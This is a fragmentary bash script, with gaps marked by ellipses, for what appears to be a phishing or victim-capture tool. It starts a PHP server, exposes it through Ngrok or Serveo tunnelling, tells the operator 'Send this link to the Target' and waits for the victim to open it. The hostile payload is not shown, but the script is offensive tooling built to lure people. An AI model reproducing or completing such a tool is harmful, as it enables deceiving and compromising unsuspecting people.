...
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (\e[0m\e[1;77mDefault:\e[0m\e[1;77m 55333\e[0m\e[1;92m): \e[0m' $default_port
read port
...
printf "\e[1;77m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
...
printf "\e[1;77m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;77m] Starting php server...\n"
...
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;92m %s\e[0m\n" $link
checkfound
}

start1() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;77m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;77m Ngrok\e[0m\n"
...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting target open the link ...\e[0m\n"
while [ true ]; do
...
printf "\e[1;93m █▄█████▄█ \e[0m\e[1;91m█─▄ █─█ █─ █▀█ ─█─ █ █─█ █─▀█ \e[0m\n"
printf "\e[1;93m █▼▼▼▼▼  \e[0m\e[1;91m  ▀▀▀ ─▀─ ─▀ ▀─▀ ─▀─ ▀ ─▀─ ▀──▀ \e[0m\n"
printf "\e[1;93m █ \e[0m\e[1;77m VERSION 0.1 \e[0m\n"
printf "\e[1;93m █▲▲▲▲▲    ╔═════════════════════════╗ \e[0m\n"
printf "\e[1;93m █████████ ║ \e[0m\e[1;94m ➣ \e[0m\e[1;77mAuthor : RANDIOLOY   \e[0m\e[1;93m║ \e[0m\n"
printf "\e[1;93m  ██ ██    ╚═════════════════════════╝ \e[0m\n"
